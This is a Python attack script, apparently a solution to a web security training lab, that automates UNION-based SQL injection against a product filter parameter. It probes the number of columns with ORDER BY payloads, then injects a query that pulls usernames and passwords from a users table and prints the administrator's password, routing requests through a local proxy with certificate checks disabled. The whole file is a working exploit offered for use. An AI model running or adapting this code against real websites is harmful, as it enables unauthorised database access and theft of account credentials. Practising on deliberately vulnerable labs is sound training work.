import requests
import sys
import re # Regular Expression
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://10.0.2.5:8080', 'https' : 'http://10.0.2.5:8080'}

def exploit_sqli(url):
	s = requests.Session()
	num_col = get_num_col(url)
	password = get_password(url, num_col)
	if password is not None:
		return True
	return False

def get_num_col(url):
	uri = '/filter?category=Pets'
	for i in range (1,50):
		payload = "' order by %s --" % i
		r = requests.get(url + uri + payload, verify = False, proxies = proxies)
		if 'Internal Server Error' in r.text:
			return i-1
	return 0

def get_password(url, col):
	uri = '/filter?category=Pets'
	payload = "' union select"
	for i in range(col - 1):
		payload = payload + ' NULL,'
	payload = payload + " username || '*' || password from users --"
	print('Payload:', payload)
	r = requests.get(url + uri + payload, verify = False, proxies = proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	admin_password=soup.find(text=re.compile('.*administrator.*')).split('*')[1]
	'''
	.* is used for regular expression and it means anything before and after is accepted
	split by *
	accept the password that is written after *
	'''
	print('[+] Administrator Password:', admin_password)
	return admin_password

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print('[-] Usage: %s <url>' % sys.argv[0])
		print('[-] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)

	if exploit_sqli(url):
		print('[+] SQLi Successful')
	else:
		print('[-] SQLi Unsuccessful')
